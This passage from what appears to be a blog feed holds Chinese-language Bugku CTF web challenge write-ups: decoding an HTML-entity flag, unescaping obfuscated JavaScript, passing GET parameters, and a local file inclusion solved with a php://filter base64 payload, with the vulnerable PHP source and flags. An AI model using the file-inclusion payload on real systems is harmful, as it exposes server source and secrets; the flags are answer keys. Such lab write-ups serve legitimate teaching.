class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>到了最后出现了flag值，但是被加密了，使用的是html加密，用Burp，或者在线工具直接解开</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--KEY&#123;J2sa42ahJK-HS11III&#125;--&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;6-WEB3&quot;&gt;&lt;a href=&quot;#6-WEB3&quot; class=&quot;headerlink&quot; title=&quot;6.WEB3&quot;&gt;&lt;/a&gt;6.WEB3&lt;/h1&gt;&lt;p&gt;链接：&lt;a href=&quot;http://123.206.87.240:8002/web3/&quot; target=&quot;
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>WEB4-bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/WEB4/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/WEB4/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:11:02.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h1><p>链接：<a href="http://123.206.87.240:8002/web4/" target="_blank" rel="noopener">http://123.206.87.240:8002/web4/</a> </p><p><strong>题目已经提示你查看源代码</strong></p><p><strong>在线unescape解密工具</strong>：<a href="https://escape.supfree.net/" target="_blank" rel="noopener">https://escape.supfree.net/</a></p><h5 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>BKCTF-WEB4<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> &gt;</span></span><br><span class="line">看看源代码？<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var p1 = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';</span></span><br><span class="line"><span class="undefined">var p2 = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';</span></span><br><span class="line"><span class="undefined">eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"input"</span> <span class="attr">name</span>=<span class="string">"flag"</span> <span class="attr">id</span>=<span class="string">"flag"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="很明显，var-p1和var-p2的值是URL码，使用unescape解密"><a href="#很明显，var-p1和var-p2的值是URL码，使用unescape解密" class="headerlink" title="很明显，var p1和var p2的值是URL码，使用unescape解密"></a>很明显，var p1和var p2的值是URL码，使用unescape解密</h5><p><strong>得到如下源码</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>BKCTF-WEB4<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> &gt;</span></span><br><span class="line">ã<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var p1 = 'function checkSubmit()&#123;var a=document.getElementById("password");if("undefined"!=typeof a)&#123;if("67d709b2b';</span></span><br><span class="line"><span class="undefined">var p2 = 'aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1&#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;';</span></span><br><span class="line"><span class="undefined">eval(unescape(p1)  + unescape('54aa2' +  p2));</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"input"</span> <span class="attr">name</span>=<span class="string">"flag"</span> <span class="attr">id</span>=<span class="string">"flag"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG出现将 p1,54aa2,p2加起来获得flag</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">67d709b2b54aa2aa648cf6e87a7114f1</span><br></pre></td></tr></table></figure><p><strong>提交获得FLAG值</strong></p><p><strong>看看源代码？      </strong></p><p>​            Submit</p><p>KEY{J22JK-HS11} </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEB4&quot;&gt;&lt;a href=&quot;#WEB4&quot; class=&quot;headerlink&quot; title=&quot;WEB4&quot;&gt;&lt;/a&gt;WEB4&lt;/h1&gt;&lt;p&gt;链接：&lt;a href=&quot;http://123.206.87.240:8002/web4/&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>WEB基础$_GET-bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/WEB%E5%9F%BA%E7%A1%80$_GET/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/WEB基础$_GET/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:02:56.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="3-WEB基础-GET"><a href="#3-WEB基础-GET" class="headerlink" title="3.WEB基础$_GET"></a>3.WEB基础$_GET</h1><p>查看题目<a href="http://123.206.87.240:8002/get/" target="_blank" rel="noopener">http://123.206.87.240:8002/get/</a></p><h5 id="1-get请求-只获取数据-放在url之中，通过-key-value-amp-key-value"><a href="#1-get请求-只获取数据-放在url之中，通过-key-value-amp-key-value" class="headerlink" title="1.get请求  只获取数据  放在url之中，通过?key=value&amp;key=value"></a>1.get请求  只获取数据  放在url之中，通过?key=value&amp;key=value</h5><p><strong>2.post请求  要对服务器产生影响  放在form Data中，通过key:value&amp;key=value </strong></p><p><strong>此处利用GET传值，意思是将what赋值给flag,才能输出flag值</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what=$_GET[<span class="string">'what'</span>];</span><br><span class="line"><span class="keyword">echo</span> $what;</span><br><span class="line"><span class="keyword">if</span>($what==<span class="string">'flag'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:8002/get/?what=flag</span></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">$what=$_GET[<span class="string">'what'</span>];</span><br><span class="line"><span class="keyword">echo</span> $what;</span><br><span class="line"><span class="keyword">if</span>($what==<span class="string">'flag'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br><span class="line">flagflag&#123;bugku_get_su8kej2en&#125;</span><br></pre></td></tr></table></figure><h4 id="相关知识点："><a href="#相关知识点：" class="headerlink" title="相关知识点："></a>相关知识点：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？：为连接符号，经常使用</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET:get是把参数数据队列加到提交表单的ACTION属性所指的URL中</span><br></pre></td></tr></table></figure><p><strong>四种传输方式：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.通过表单，这种形式和$_POST获取数据的方式很类似</span><br><span class="line">获取形式：$dataVar=$_GET[&apos;表单元素name属性的值&apos;];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.通过地址栏，直接在地址栏中输入数据，也是本题使用的方法</span><br><span class="line">&lt;a href=”content.php?news_id=12&amp;cat=国内新闻”&gt;新闻标题&lt;/a&gt;</span><br><span class="line">$id=$_GET[‘news_id’];获取方式</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">3.通过JS跳转</span><br><span class="line">  所谓的js页面跳转就是利用javesrcipt对打开的页面ULR进行跳转，如我们打开的是A页面，通过javsrcipt脚本就会跳转到B页面。</span><br><span class="line">例如：</span><br><span class="line">&lt;a href=&quot;#&quot; onclick=&quot;location.href=&apos;content.php?news_id=12&amp;cat=国内新闻&apos;&quot;&gt;新闻标题&lt;/a&gt;</span><br><span class="line">从content.php跳转到国内新闻</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;#&quot; onclick=&quot;if(confirm(&apos;真的要删除吗？&apos;))location.href=&apos;content.php?id=100&apos;&quot;&gt;删除&lt;/a&gt;</span><br><span class="line">从onclick=&quot;if(confirm(&apos;真的要删除吗？&apos;))跳转到content.php?id=100</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;content.php?id=100&quot; onclick=&quot;return confirm(&apos;真的要删除么？&apos;)&quot;&gt;删除&lt;/a&gt;</span><br><span class="line">从content.php?id=100跳转到onclick=&quot;if(confirm(&apos;真的要删除吗？&apos;))</span><br></pre></td></tr></table></figure><p>获取方式都是一样的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">      $id=$_GET[‘news_id’];</span><br><span class="line">?&gt;</span><br><span class="line">都是获取表单元素</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4.header函数跳转</span><br><span class="line">&lt;?php</span><br><span class="line">      header(‘location:content.php?id=14’)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">      $id=$_GET[&apos;id&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">header() 函数向客户端发送原始的 HTTP 报头。</span><br><span class="line">   </span><br><span class="line"><span class="comment">//设置一个404头:  </span></span><br><span class="line">header(<span class="string">'HTTP/1.1 404 Not Found'</span>);  </span><br><span class="line"><span class="comment">//定义编码  </span></span><br><span class="line">header( <span class="string">'Content-Type:text/html;charset=utf-8 '</span>);  </span><br><span class="line"><span class="comment">//PDF  </span></span><br><span class="line">header(<span class="string">'Content-type: application/pdf'</span>);  </span><br><span class="line"><span class="comment">// ok  </span></span><br><span class="line">header(<span class="string">'HTTP/1.1 200 OK'</span>);  </span><br><span class="line"><span class="comment">//转到一个新地址  </span></span><br><span class="line">header(<span class="string">'Location: http://www.example.org/'</span>);  </span><br><span class="line"><span class="comment">//文档语言  </span></span><br><span class="line">header(<span class="string">'Content-language: en'</span>);  </span><br><span class="line"><span class="comment">//设置内容长度  </span></span><br><span class="line">header(<span class="string">'Content-Length: 1234'</span>);  </span><br><span class="line"><span class="comment">//设置内容类型:  </span></span><br><span class="line">header(<span class="string">'Content-Type: image/jpeg'</span>); <span class="comment">//JPG***  </span></span><br><span class="line">header(<span class="string">'Content-Type: text/plain'</span>); <span class="comment">//纯文本格式  </span></span><br><span class="line">header(<span class="string">'Content-Type: application/zip'</span>); <span class="comment">// ZIP文件</span></span><br><span class="line">header(<span class="string">'Content-Type: application/pdf'</span>); <span class="comment">// PDF文件</span></span><br><span class="line">--------------------- </span><br><span class="line">    </span><br><span class="line">原文：https:<span class="comment">//blog.csdn.net/qq_41173457/article/details/81546043</span></span><br></pre></td></tr></table></figure><h5 id="1、虽然有四种形式，但究其根本，都是通过地址栏进行传值"><a href="#1、虽然有四种形式，但究其根本，都是通过地址栏进行传值" class="headerlink" title="1、虽然有四种形式，但究其根本，都是通过地址栏进行传值"></a>1、虽然有四种形式，但究其根本，都是通过地址栏进行传值</h5><h4 id="2、地址栏中传多个值，用-amp-连接，地址栏传值不能含有空格"><a href="#2、地址栏中传多个值，用-amp-连接，地址栏传值不能含有空格" class="headerlink" title="2、地址栏中传多个值，用&amp;连接，地址栏传值不能含有空格"></a>2、地址栏中传多个值，用&amp;连接，地址栏传值不能含有空格</h4><h5 id="3、当表单的method为post时，可以有post和get两种传值方式"><a href="#3、当表单的method为post时，可以有post和get两种传值方式" class="headerlink" title="3、当表单的method为post时，可以有post和get两种传值方式"></a>3、当表单的method为post时，可以有post和get两种传值方式</h5><h5 id="a-对于表单控件来说，此时必须用post传值方式"><a href="#a-对于表单控件来说，此时必须用post传值方式" class="headerlink" title="a) 对于表单控件来说，此时必须用post传值方式"></a>a) 对于表单控件来说，此时必须用post传值方式</h5><h5 id="b-对于action属性来说，可以用get方式进行传值，如-lt-formmethod-”post”-action-”news-php-id-100”-gt"><a href="#b-对于action属性来说，可以用get方式进行传值，如-lt-formmethod-”post”-action-”news-php-id-100”-gt" class="headerlink" title="b) 对于action属性来说，可以用get方式进行传值，如&lt;formmethod=”post” action=”news.php?id=100”&gt;"></a>b) 对于action属性来说，可以用get方式进行传值，如&lt;formmethod=”post” action=”news.php?id=100”&gt;</h5><h5 id="4、当表单的method为get时"><a href="#4、当表单的method为get时" class="headerlink" title="4、当表单的method为get时"></a>4、当表单的method为get时</h5><h5 id="a-对表单控件来说，此时必须使用get传值方式"><a href="#a-对表单控件来说，此时必须使用get传值方式" class="headerlink" title="a) 对表单控件来说，此时必须使用get传值方式"></a>a) 对表单控件来说，此时必须使用get传值方式</h5><h5 id="b-对于action属性来说，get传值无效"><a href="#b-对于action属性来说，get传值无效" class="headerlink" title="b) 对于action属性来说，get传值无效"></a>b) 对于action属性来说，get传值无效</h5>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;3-WEB基础-GET&quot;&gt;&lt;a href=&quot;#3-WEB基础-GET&quot; class=&quot;headerlink&quot; title=&quot;3.WEB基础$_GET&quot;&gt;&lt;/a&gt;3.WEB基础$_GET&lt;/h1&gt;&lt;p&gt;查看题目&lt;a href=&quot;http://123.206.87.2
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>flag值在index中--bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/flag%E5%80%BC%E5%9C%A8index%E9%87%8C/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/flag值在index里/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:01:08.589Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flag值在index中"><a href="#flag值在index中" class="headerlink" title="flag值在index中"></a>flag值在index中</h1><p>链接：<a href="http://123.206.87.240:8005/post/" target="_blank" rel="noopener">http://123.206.87.240:8005/post/</a> </p><h5 id="先看题目，是一个超链接"><a href="#先看题目，是一个超链接" class="headerlink" title="先看题目，是一个超链接"></a>先看题目，是一个超链接</h5><p><a href="http://123.206.87.240:8005/post/index.php?file=show.php" target="_blank" rel="noopener">click me? no</a> </p><p><strong>打开显示</strong></p><p><strong>test5</strong></p><h5 id="看源码也没什么有价值的。。"><a href="#看源码也没什么有价值的。。" class="headerlink" title="看源码也没什么有价值的。。"></a>看源码也没什么有价值的。。</h5><p><strong>但是题目提示，flag值在index中，，直接想到base64读取index.php文件</strong></p><p><strong>这也是个小技巧，没有任何提示下使用base64读取</strong></p><h5 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert-base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><h5 id="返回了base64位码"><a href="#返回了base64位码" class="headerlink" title="返回了base64位码"></a>返回了base64位码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==</span><br></pre></td></tr></table></figure><h5 id="解码为"><a href="#解码为" class="headerlink" title="解码为"></a>解码为</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="涉及知识："><a href="#涉及知识：" class="headerlink" title="涉及知识："></a>涉及知识：</h3><h5 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h5><h5 id="base64读取文件"><a href="#base64读取文件" class="headerlink" title="base64读取文件"></a>base64读取文件</h5><h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br></pre></td></tr></table></figure><h3 id="相关php伪协议："><a href="#相关php伪协议：" class="headerlink" title="相关php伪协议："></a>相关php伪协议：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p>伪协议原文地址：<a href="https://blog.csdn.net/u010726042/article/details/75041367" target="_blank" rel="noopener">https://blog.csdn.net/u010726042/article/details/75041367</a></p><h3 id="Base64位码PHP命令"><a href="#Base64位码PHP命令" class="headerlink" title="Base64位码PHP命令"></a>Base64位码PHP命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><h5 id="网上大佬解析base64含义"><a href="#网上大佬解析base64含义" class="headerlink" title="网上大佬解析base64含义"></a>网上大佬解析base64含义</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">现在具体说说file=php://filter/read=convert.base64-encode/resource=index.php的含义</span><br><span class="line"></span><br><span class="line">首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</span><br><span class="line"></span><br><span class="line">通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</span><br><span class="line"></span><br><span class="line">而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</span><br><span class="line"></span><br><span class="line">如果不进行base64编码传入，就会直接执行，而flag的信息在注释中，是得不到的</span><br><span class="line">--------------------- </span><br><span class="line">作者：孤鸿影～ </span><br><span class="line">来源：CSDN </span><br><span class="line">原文：https://blog.csdn.net/zpy1998zpy/article/details/80585443 </span><br><span class="line">版权声明：本文为博主原创文章，转载请附上博文链接！</span><br></pre></td></tr></table></figure><p>链接：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80585443" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80585443</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;flag值在index中&quot;&gt;&lt;a href=&quot;#flag值在index中&quot; class=&quot;headerlink&quot; title=&quot;flag值在index中&quot;&gt;&lt;/a&gt;flag值在index中&lt;/h1&gt;&lt;p&gt;链接：&lt;a href=&quot;http://123.206.87.
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>web基础$_POST-bugku</title>
    <link href="https://fengchao1847081353.github.io/2019/06/03/WEB%E9%A2%98-bugku/WEB%E5%9F%BA%E7%A1%80$_POST/"/>
    <id>https://fengchao1847081353.github.io/2019/06/03/WEB题-bugku/WEB基础$_POST/</id>
    <published>2019-06-03T13:50:37.000Z</published>
    <updated>2019-06-03T14:04:02.186Z</updated>
    
